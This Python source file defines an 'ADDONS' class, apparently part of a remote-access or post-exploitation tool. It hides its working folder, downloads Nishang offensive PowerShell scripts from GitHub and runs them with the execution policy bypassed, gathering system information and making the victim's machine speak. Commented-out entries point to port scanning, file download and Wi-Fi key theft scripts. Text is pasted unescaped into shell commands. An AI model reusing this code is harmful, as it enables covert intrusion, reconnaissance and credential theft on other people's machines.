
class ADDONS:
    VOICE = "https://raw.githubusercontent.com/samratashok/nishang/master/Misc/Speak.ps1"
    ADVANCED_INFO = "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1"
    #PORT_SCAN = "https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1"
    #DOWNLOAD_WEB = "https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Download.ps1"
    #WIFI = "'https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1'"
    PATH = "ADDONS"

    def check(self):
        if not os.path.exists(self.PATH):
            os.mkdir(self.PATH)
            command = "attrib +h "+'"'+self.PATH+'"'
            self.run(command)
        return "created path"


    def run(self,command):
        comm = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        output, errors = comm.communicate()
        return output + errors

    def voice(self,command):
        self.check()
        try:
            path = os.path.join(self.PATH,"Speak.ps1")
            if not os.path.exists(path):
                print("LOADING VOICE MODULE FROM NET")
                urllib.request.urlretrieve(self.VOICE, path)
                print("LOADING COMPLETED")
            COMMAND = 'PowerShell -ExecutionPolicy Bypass -Command "& {. ./addons/Speak.ps1; Speak \''+command+"'}"+'"'
            result = self.run(COMMAND)
            if (result) == "1\n":
                return f"[*]succesfully spoke '{command}'"
            else:
                return f"ERROR IN POWERSHELL {result}"
        except Exception as e:
            return f"Unable to speak {command} [" + str(e)+ "]"  
    
    def info(self):
        self.check()
        try:
            path = os.path.join(self.PATH,"Get-Information.ps1")
            if not os.path.exists(path):
                print("LOADING VOICE MODULE FROM NET")
                urllib.request.urlretrieve(self.ADVANCED_INFO, path)
                print("LOADING COMPLETED")
            COMMAND = 'PowerShell -ExecutionPolicy Bypass -Command "& {. ./addons/Get-Information.ps1; Get-Information}"'
            result = self.run(COMMAND)
            return result
        except Exception as e:
            return f"Unable to fetch info [" + str(e)+ "]" 
    
    

    

    
    
    

